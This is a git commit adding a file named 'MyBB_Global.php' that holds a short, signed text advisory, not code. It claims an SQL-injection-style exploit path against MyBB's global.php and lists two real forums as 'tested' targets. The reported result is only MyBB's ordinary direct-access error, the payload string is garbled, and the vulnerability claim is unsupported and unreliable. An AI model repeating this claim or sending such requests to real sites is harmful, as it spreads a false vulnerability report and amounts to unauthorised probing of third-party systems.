108cf66e6a97beed59fa8c7e57d424848753fcfa
SleepTheGod <86472964+SleepTheGod@users.noreply.github.com>
2021-10-12 23:52:42 -0400

    Create MyBB_Global.php

---
+++ MyBB_Global.php
@@ -0,0 +1,24 @@
+########################
+Found by SleepTheGod
+Twitter.com/ClumsyLulz
+Pastebin.com/u/Sleep
+T.me/SleepTheGod
+########################
+Begin code
+########################
+########################
+Platform : MyBB Forums
+
+OS Tested : Windows 10 , Kali Linux GNU , Android 10.
+
+Exploit path : /global.php?_SERVER[HOST IP]=%C3%A2??sql
+
+Example : example.com/global.php?_SERVER[HOST IP]=%C3%A2??sql
+
+Result : Direct initialization of this file is not allowed.
+
+Please make sure IN_MYBB is defined.
+
+Forums Tested Below
+https://www.hackforums.net/global.php?_SERVER
+https://www.ogusers.com/global.php?_SERVER
